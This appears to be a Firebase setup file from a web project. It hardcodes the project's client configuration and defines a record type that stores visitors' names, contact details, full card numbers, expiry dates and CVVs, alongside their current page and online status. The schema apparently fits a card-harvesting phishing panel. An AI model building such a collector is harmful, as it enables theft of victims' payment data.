import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore } from 'firebase/firestore';
import { getDatabase } from 'firebase/database';

const firebaseConfig = {
   apiKey: "AIzaSyCTizRBYkfD4dfV_QjpPBOxJhYji3f5bQc",
  authDomain: "swidah-mormr-enw.firebaseapp.com",
  databaseURL: "https://swidah-mormr-enw-default-rtdb.firebaseio.com",
  projectId: "swidah-mormr-enw",
  storageBucket: "swidah-mormr-enw.firebasestorage.app",
  messagingSenderId: "472801298504",
  appId: "1:472801298504:web:0dc80587cf6c0839cef07d",
  measurementId: "G-0V8CCB874S"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);
export { app, auth, db,database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
  isOnline?: boolean
  lastSeen: string
}
